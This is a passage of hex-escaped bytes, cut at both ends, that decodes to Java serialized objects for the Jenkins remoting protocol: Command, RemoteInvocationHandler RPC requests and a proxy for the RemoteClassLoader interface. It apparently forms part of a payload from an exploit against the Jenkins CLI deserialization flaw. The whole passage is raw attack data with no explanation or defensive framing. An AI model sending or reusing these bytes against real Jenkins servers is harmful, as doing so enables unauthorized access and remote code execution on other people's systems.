f\\x6d\\x6d\\x61\\x6e\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x09\\x63\\x72\\x65\\x61\\x74\\x65\\x64\\x41\\x74\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x3b\\x78\\x70\\x73\\x72\\x00\\x1e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x24\\x53\\x6f\\x75\\x72\\x63\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x06\\x74\\x68\\x69\\x73\\x24\\x30\\x74\\x00\\x19\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x3b\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a\\x3b\\x1c\\xc4\\x02\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5\\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x71\\x00\\x7e\\x00\\x03\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x74\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x4c\\x00\\x14\\x73\\x75\\x70\\x70\\x72\\x65\\x73\\x73\\x65\\x64\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x73\\x74\\x00\\x10\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4c\\x69\\x73\\x74\\x3b\\x78\\x70\\x71\\x00\\x7e\\x00\\x10\\x70\\x75\\x72\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x02\\x46\\x2a\\x3c\\x3c\\xfd\\x22\\x39\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x0c\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x61\\x09\\xc5\\x9a\\x26\\x36\\xdd\\x85\\x02\\x00\\x04\\x49\\x00\\x0a\\x6c\\x69\\x6e\\x65\\x4e\\x75\\x6d\\x62\\x65\\x72\\x4c\\x00\\x0e\\x64\\x65\\x63\\x6c\\x61\\x72\\x69\\x6e\\x67\\x43\\x6c\\x61\\x73\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x66\\x69\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x00\\x00\\x00\\x43\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x74\\x00\\x0c\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x06\\x3c\\x69\\x6e\\x69\\x74\\x3e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x32\\x71\\x00\\x7e\\x00\\x15\\x71\\x00\\x7e\\x00\\x16\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x63\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x0c\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x3c\\x74\\x00\\x1b\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x10\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x03\\x08\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x74\\x00\\x0c\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x04\\x63\\x61\\x6c\\x6c\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\xfa\\x74\\x00\\x27\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x74\\x00\\x1c\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x06\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x73\\x71\\x00\\x7e\\x00\\x13\\xff\\xff\\xff\\xff\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x24\\x50\\x72\\x6f\\x78\\x79\\x31\\x70\\x74\\x00\\x0f\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x04\\xe7\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x74\\x00\\x15\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x52\\x65\\x6d\\x6f\\x74\\x65\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x93\\x74\\x00\\x0e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x74\\x00\\x08\\x43\\x4c\\x49\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x48\\x74\\x00\\x1f\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x74\\x00\\x19\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x07\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\xdf\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x74\\x00\\x05\\x5f\\x6d\\x61\\x69\\x6e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\x86\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x74\\x00\\x04\\x6d\\x61\\x69\\x6e\\x73\\x72\\x00\\x26\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x4c\\x69\\x73\\x74\\xfc\\x0f\\x25\\x31\\xb5\\xec\\x8e\\x10\\x02\\x00\\x01\\x4c\\x00\\x04\\x6c\\x69\\x73\\x74\\x71\\x00\\x7e\\x00\\x0f\\x78\\x72\\x00\\x2c\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x19\\x42\\x00\\x80\\xcb\\x5e\\xf7\\x1e\\x02\\x00\\x01\\x4c\\x00\\x01\\x63\\x74\\x00\\x16\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x3b\\x78\\x70\\x73\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x41\\x72\\x72\\x61\\x79\\x4c\\x69\\x73\\x74\\x78\\x81\\xd2\\x1d\\x99\\xc7\\x61\\x9d\\x03\\x00\\x01\\x49\\x00\\x04\\x73\\x69\\x7a\\x65\\x78\\x70\\x00\\x00\\x00\\x00\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x71\\x00\\x7e\\x00\\x3c\\x78\\x71\\x00\\x7e\\x00\\x08\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x70\\x73\\x7d\\x00\\x00\\x00\\x02\\x00\\x2e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x00\\x1c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x49\\x52\\x65\\x61\\x64\\x52\\x65\\x73\\x6f\\x6c\\x76\\x65\\x78\\x72\\x00\\x17\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x72\\x65\\x66\\x6c\\x65\\x63\\x74\\x2e\\x50\\x72\\x6f\\x78\\x79\\xe1\\x27\\xda\\x20\\xcc\\x10\\x43\\xcb\\x02\\x00\\x01\\x4c\\x00\\x01\\x68\\x74\\x00\\x25\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x72\\x65\\x66\\x6c\\x65\\x63\\x74\\x2f\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x3b\\x78\\x70\\x73\\x72\\x00\\x27\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x03\\x00\\x05\\x5a\\x00\\x14\\x61\\x75\\x74\\x6f\\x55\\x6e\\x65\\x78\\x70\\x6f\\x72\\x74\\x42\\x79\\x43\\x61\\x6c\\x6c\\x65\\x72\\x5a\\x00\\x09\\x67\\x6f\\x69\\x6e\\x67\\x48\\x6f\\x6d\\x65\\x49\\x00\\x03\\x6f\\x69\\x64\\x5a\\x00\\x09\\x75\\x73\\x65\\x72\\x50\\x72\\x6f\\x78\\x79\\x4c\\x00\\x06\\x6f\\x72\\x69\\x67\\x69\\x6e\\x71\\x00\\x7e\\x00\\x0d\\x78\\x70\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x73\\x71\\x00\\x7e\\x00\\x0b\\x71\\x00\\x7e\\x00\\x43\\x74\\x00\\x78\\x50\\x72\\x6f\\x78\\x79\\x20\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x40\\x32\\x20\\x77\\x61\\x73\\x20\\x63\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x66\\x6f\\x72\\x20\\x69\\x6e\\x74\\x65\\x72\\x66\\x61\\x63\\x65\\x20\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x75\\x71\\x00\\x7e\\x00\\x11\\x00\\x00\\x00\\x0d\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x7d\\x71\\x00\\x7e\\x00\\x24\\x71\\x00\\x7e\\x00\\x25\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x89\\x71\\x00\\x7e\\x00\\x24\\x71\\x00\\x7e\\x00\\x25\\x74\\x00\\x04\\x77\\x72\\x61\\x70\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x02\\x6a\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x74\\x00\\x06\\x65\\x78\\x70\\x6f\\x72\\x74\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x02\\xa6\\x74\\x00\\x21\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x74\\x00\\x16\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x4a\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x46\\x71\\x00\\x7e\\x00\\x1d\\x71\\x00\\x7e\\x00\\x1e\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x03\\x08\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x71\\x00\\x7e\\x00\\x22\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\xfa\\x71\\x00\\x7e\\x00\\x24\\x71\\x00\\x7e\\x00\\x25\\x71\\x00\\x7e\\x00\\x26\\x73\\x71\\x00\\x7e\\x00\\x13\\xff\\xff\\xff\\xff\\x71\\x00\\x7e\\x00\\x28\\x70\\x71\\x00\\x7e\\x00\\x29\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x04\\xe7\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x71\\x00\\x7e\\x00\\x2b\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x93\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x48\\x71\\x00\\x7e\\x00\\x30\\x71\\x00\\x7e\\x00\\x31\\x71\\x00\\x7e\\x00\\x32\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\xdf\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x71\\x00\\x7e\\x00\\x34\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\x86\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x71\\x00\\x7e\\x00\\x36\\x71\\x00\\x7e\\x00\\x3a\\x78\\x78\\x75\\x72\\x00\\x02\\x5b\\x42\\xac\\xf3\\x17\\xf8\\x06\\x08\\x54\\xe0\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x07\\x46\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x32\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x24\\x52\\x50\\x43\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x04\\x49\\x00\\x03\\x6f\\x69\\x64\\x5b\\x00\\x09\\x61\\x72\\x67\\x75\\x6d\\x65\\x6e\\x74\\x73\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x05\\x74\\x79\\x70\\x65\\x73\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x77\\x08\\xff\\xff\\xff\\xfe\\x00\\x00\\x00\\x02\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x49\\x00\\x02\\x69\\x64\\x49\\x00\\x08\\x6c\\x61\\x73\\x74\\x49\\x6f\\x49\\x64\\x4c\\x00\\x08\\x72\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x74\\x00\\x1a\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x3b\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x09\\x63\\x72\\x65\\x61\\x74\\x65\\x64\\x41\\x74\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x3b\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x70\\x73\\x72\\x00\\x1e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x24\\x53\\x6f\\x75\\x72\\x63\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x06\\x74\\x68\\x69\\x73\\x24\\x30\\x74\\x00\\x19\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x3b\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a\\x3b\\x1c\\xc4\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5\\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x71\\x00\\x7e\\x00\\x02\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x74\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x4c\\x00\\x14\\x73\\x75\\x70\\x70\\x72\\x65\\x73\\x73\\x65\\x64\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x73\\x74\\x00\\x10\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4c\\x69\\x73\\x74\\x3b\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x71\\x00\\x7e\\x00\\x10\\x70\\x75\\x72\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x02\\x46\\x2a\\x3c\\x3c\\xfd\\x22\\x39\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x0b\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x61\\x09\\xc5\\x9a\\x26\\x36\\xdd\\x85\\x02\\x00\\x04\\x49\\x00\\x0a\\x6c\\x69\\x6e\\x65\\x4e\\x75\\x6d\\x62\\x65\\x72\\x4c\\x00\\x0e\\x64\\x65\\x63\\x6c\\x61\\x72\\x69\\x6e\\x67\\x43\\x6c\\x61\\x73\\x73\\x71\\x00\\x7e\\x00\\x02\\x4c\\x00\\x08\\x66\\x69\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x02\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x02\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x43\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x74\\x00\\x0c\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x06\\x3c\\x69\\x6e\\x69\\x74\\x3e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x32\\x71\\x00\\x7e\\x00\\x15\\x71\\x00\\x7e\\x00\\x16\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x63\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x0c\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x02\\x39\\x74\\x00\\x32\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x24\\x52\\x50\\x43\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x1c\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\xf6\\x74\\x00\\x27\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x71\\x00\\x7e\\x00\\x1e\\x74\\x00\\x06\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x73\\x71\\x00\\x7e\\x00\\x13\\xff\\xff\\xff\\xff\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x24\\x50\\x72\\x6f\\x78\\x79\\x31\\x70\\x74\\x00\\x0f\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x04\\xe7\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x74\\x00\\x0c\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x15\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x52\\x65\\x6d\\x